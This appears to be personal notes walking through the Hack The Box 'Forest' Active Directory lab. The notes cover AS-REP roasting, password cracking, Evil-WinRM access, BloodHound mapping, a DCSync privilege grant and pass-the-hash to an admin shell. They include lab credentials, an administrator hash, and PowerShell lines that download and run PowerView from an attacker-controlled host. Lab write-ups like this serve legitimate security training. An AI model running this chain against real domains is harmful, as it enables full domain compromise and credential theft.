#window #HackTheBox #AD
# Enum
## nmap
```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV forest
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-28 00:04:15Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-28T00:04:22
|_  start_date: 2023-04-27T23:43:12
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-04-27T17:04:23-07:00`
```

## ldap
└─# rpcclient -U "" -N -c enumdomusers htb.local
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
# Exploit ASRepRoast #ExploitAD
└─# impacket-GetNPUsers -request 'htb.local/' -format john -outputfile hash -dc-ip 10.129.95.210
└─# john hash -wordlist=/usr/share/wordlists/rockyou.txt
```
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
```

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/htb]
└─# 
```
crackmapexec smb 10.129.223.250 -u svc-alfresco -p s3rvice --shares
```
SMB         10.129.223.250  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.223.250  445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.223.250  445    FOREST           [+] Enumerated shares
SMB         10.129.223.250  445    FOREST           Share           Permissions     Remark
SMB         10.129.223.250  445    FOREST           -----           -----------     ------
SMB         10.129.223.250  445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.223.250  445    FOREST           C$                              Default share
SMB         10.129.223.250  445    FOREST           IPC$                            Remote IPC
SMB         10.129.223.250  445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.223.250  445    FOREST           SYSVOL          READ            Logon server share 
                                                                                                       

# Foothold
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/htb]
└─# evil-winrm -i htb -u svc-alfresco -p s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```
upload SharpHound.exe

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```
.\SharpHound.exe --CollectionMethods All --LdapUsername svc-alfresco --LdapPassword s3rvice --Domain HTB.local --ZipFileName ad.zip --OutputDirectory C:\Users\svc-alfresco\Documents\

```

└─# neo4j start
└─# bloodhound
	load ad.zip
	Analysis : shortest path from owned principale
	![[Pasted image 20230618152153.png]]
	Reachable High Value Targets
	![[Pasted image 20230620002814.png]]

**└─#** Start a smb server
```
impacket-smbserver roronoa $(pwd) -smb2support -user roronoa -password roronoa

```

*Evil-WinRM* PS C:\> (create new drive for smb share)
```
$SecPassword = ConvertTo-SecureString 'roronoa' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('roronoa', $SecPassword)
New-PSDrive -Name roronoa -PSProvider FileSystem -Credential $Cred -Root \\10.10.17.159\roronoa

```
*Evil-WinRM* PS roronoa:\>  (execute Powerview)
```
IEX(New-Object Net.WebClient).DownloadString("http://10.10.17.159/PowerView.ps1")
```

# PrivEsc
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> (create new user and grant DCsync privilege)
```
net user roronoa roronoa /add /domain
net group "EXCHANGE WINDOWS PERMISSIONS" /add roronoa
IEX(New-Object Net.WebClient).DownloadString("http://10.10.17.159/PowerView.ps1")
$SecPassword = ConvertTo-SecureString 'roronoa' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\roronoa', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentit "DC=htb,DC=local" -PrincipalIdentity roronoa -Rights DCSync

```

**└─#** 
```
impacket-secretsdump htb.local/roronoa:roronoa@10.129.95.210

````

*└─#* 
```
crackmapexec smb 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6

```
SMB         10.129.95.210   445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (*Pwn3d!*)

*└─#* (get admin shell)
```
impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.129.95.210

```